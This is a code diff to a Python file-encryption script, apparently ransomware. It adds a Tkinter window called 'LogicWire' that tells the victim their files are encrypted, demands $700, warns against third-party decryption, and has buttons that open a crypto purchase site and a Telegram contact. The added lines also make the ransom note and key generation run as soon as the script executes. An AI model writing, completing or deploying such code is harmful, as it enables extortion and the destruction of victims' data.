@@ -1,9 +1,73 @@
 from cryptography.fernet import Fernet
+from tkinter import *
+import webbrowser
 import os
 import glob
 import random
 import string
 import requests
+import urllib.request
+
+def main():
+    new = 1
+    btcurl = "https://buy.moonpay.io"
+    tgmurl = "https://t.me/z01youl"
+    window = Tk()
+    url = 'https://icon-icons.com/downloadimage.php?id=76799&root=1061/ICO/512/&file=pirate_icon-icons.com_76799.ico'
+    urllib.request.urlretrieve(url, 'ico.ico')
+    window.wm_iconbitmap('ico.ico')
+    window.title("LogicWire")
+    window.geometry('1100x700')
+    window.configure(bg='black')
+    lbl = Label(window, text="LogicWire", font=("Arial Bold", 50), foreground="red", background="black")
+    lbl.config(anchor=CENTER)
+    lbl.pack()
+    lbl = Label(window, text="", font=("Arial Bold", 20), foreground="red", background="black")
+    lbl.config(anchor=CENTER)
+    lbl.pack()
+    message = """
+    All your files have been encrypted due to a security problem with your PC. 
+    If you want to restore them, write us to our Telegram profil by clicking on the "Contact" button.
+    Then i will show you how to pay the amount of 700$.
+    """
+    lbl = Label(window, text=message, font=("Arial Bold", 10), foreground="white", background="black")
+    lbl.config(anchor=CENTER)
+    lbl.pack()
+    message2 = """
+        Attention
+    
+        Do not rename encrypted files.
+        Do not try to decrypt your data using third party software, it may cause permanent data loss.
+        Decryption of your files with the help of third parties may cause increased price (they add their fee to our) or you can become a victim of a scam.
+        """
+    attention = Label(window, text=message2, font=("Arial Bold", 10), foreground="white", background="red")
+    attention.config(anchor=CENTER)
+    attention.pack()
+    lbl2 = Label(window, text="", font=("Arial Bold", 10), foreground="red", background="black")
+    lbl2.config(anchor=CENTER)
+    lbl2.pack()
+    ln = Label(text="", bg="black")
+    ln.config(anchor=CENTER)
+    ln.pack()
+    lbl3 = Label(window, text="", font=("Arial Bold", 10), foreground="red", background="black")
+    lbl3.config(anchor=CENTER)
+    lbl3.pack()
+    
+    def btcaddress():
+        webbrowser.open(btcurl, new=new)
+    def telegramtag():
+        webbrowser.open(tgmurl, new=new)
+
+    btn = Button(window, text="Pay", command=btcaddress)
+    btn.config(anchor=CENTER)
+    btn.pack()
+    ln2 = Label(window, text="", font=("Arial Bold", 10), foreground="red", background="black")
+    ln2.config(anchor=CENTER)
+    ln2.pack()
+    btn2 = Button(window, text="Contact", command=telegramtag)
+    btn2.config(anchor=CENTER)
+    btn2.pack()
+    window.mainloop()
 
 def write_key():
     """
@@ -50,6 +114,8 @@ def decrypt(dir, key):
         with open(filename, "wb") as file:
             file.write(decrypted_data)
 
+main()
+write_key()
 key = load_key()
 dir = "fichiers"
 
